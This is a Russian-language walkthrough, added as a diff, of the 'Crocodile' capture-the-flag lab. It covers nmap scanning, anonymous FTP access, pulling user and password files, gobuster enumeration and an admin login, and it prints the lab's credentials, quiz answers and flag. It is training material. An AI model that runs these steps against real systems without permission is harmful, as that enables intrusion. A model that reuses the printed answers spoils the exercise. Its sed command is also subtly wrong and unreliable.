@@ -1,0 +1,120 @@
+*** CROCODILE 
+
+### APACHE + FTP DATABASE 
+
+	
+	- Какой спецификатор сканирования nmap испльзуется для запуска дефолтного 
+	набора скриптов --script=default
+		
+		# -sC 
+
+	- Какая версия службы работает на 21 порту 
+		
+		@ nmap -sV {target_ip}
+		
+		#vsftpd 3.0.3 
+
+	- Какой FTP-code возвращается для сообщения "Анонимный FTP-вход разрешен"
+		
+		@ ftp {target_ip}
+			
+			Name (10.129.1.15:mwuckert): anonymous
+			230 Login successful.
+
+		# 230 
+
+	- Какая каманда используется для загрузки файлов с FTP-сервера 
+		
+		@ dir
+			
+			allowed.userlist
+			allowed.userlist.passwd
+
+		@ get allowed.userlist
+		@ get allowed.userlist.passwd 
+		
+		# get 
+
+	- Какое из имен пользователей с более высоким уровнем привилегий
+		
+		@ cat allowed.userlist
+			
+			aron
+			pwnmeow
+			egotisticalsw
+			admin
+
+		# admin
+
+	- Какая версия HTTP-сервера Apache работает на целевом хосте 
+		
+		@ nmap -sV {target_ip}
+
+		# 2.4.41
+
+	- Как называется удобный плагин для анализа веб-сайтов, который мы можем 
+	установить в наш браузер?
+
+		https://addons.mozilla.org/ru/firefox/addon/wappalyzer/
+
+		# Wappalayzer 
+
+	- Какой переключатель мы можем использовать с gobuster, чтобы указать, что 
+	мы ищем определенные типы файлов?
+
+		@ gobuster --url http://{target_ip}/ --wordlist \ 
+		{wodslist_dir}/Seclist/Discovery/Web-Content/directory-list-2.3-small.txt \
+		-x php,html
+
+		# -x 
+
+	- Какой файл мы нашли, что может дать нам плацдарм на цель?
+		
+		@ gobuster --url http://{target_ip}/ --wordlist \ 
+		{wodslist_dir}/Seclist/Discovery/Web-Content/directory-list-2.3-small.txt \
+		-x php,html
+			
+			login.php (STATUS: 200) [Size: 58565]
+
+		# login.php 
+
+
+### CATCH FLAG BY USE AUTORISATION FORM 
+	
+
+	- go to url: http://{target_ip}/login.php 
+		
+		username:
+		password:	
+	
+	- search username and password from found files
+		
+		allowed.userlist
+		allowed.userlist.passwd
+
+		@ cat allowed.userlist
+						
+			aron
+			pwnmeow
+			egotisticalsw
+			admin							----> NEED USER 
+
+		@ cat allowed.userlist | grep -n admin | cut -d ':' -f 1
+			
+			4								----> NUM OF STRING IN FILE 
+		
+		@ cat allowed.userlist.passwd | sed '4!p' 
+			
+			rKXM59ESxesUFHAd 				----> PASS IN 4 STRING
+
+	
+	- input username and password to login.php 
+
+		username: admin
+		password: rKXM59ESxesUFHAd
+
+		# Autorisation SUCCESS
+
+		flag was found c7110277ac44d78b6a9fff2232434d16
+
+		
